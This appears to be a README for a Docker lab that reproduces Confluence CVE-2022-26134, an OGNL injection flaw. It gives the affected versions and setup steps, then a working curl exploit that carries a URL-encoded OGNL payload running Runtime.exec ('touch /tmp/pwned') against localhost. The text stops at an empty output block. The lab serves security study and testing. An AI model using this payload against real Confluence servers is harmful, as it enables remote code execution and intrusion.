# Confluence CVE-2022-26134 OGNL vulnerability

This vulnerability affects Confluence Server and Confluence Data Center. It allows an attacker to send a specially crafted HTTP request to abuse OGNL within Confluence, leading to remote code execution.

In order for this vulnerability to be exploitable, the following conditions must be met:
* Use versions of Confluence lower than 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4 and 7.18.1
* Confluence is configured (can't use a server that hasn't been installed and not connected to a DB)


## Running the application

Run it:

```
docker-compose up
```

Install confluence

1. Navigate to `localhost:8090`
2. Get a trial license (this won't work without one)
3. In db setup step, put in hostname: `db`, port: `5432`, dbname: `conf`, username: `postgres`, password: `koko`
4. It'll take a while to configure, make sure you have 3-4gb of RAM
5. Use a test site/template, and use confluence to manage users. Fill in default for admin
6. Once you get past the admin creation step, you can run the exploit

## Exploitation steps

```
curl -v http://localhost:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/pwned%22%29%7D/
```

Output:

```
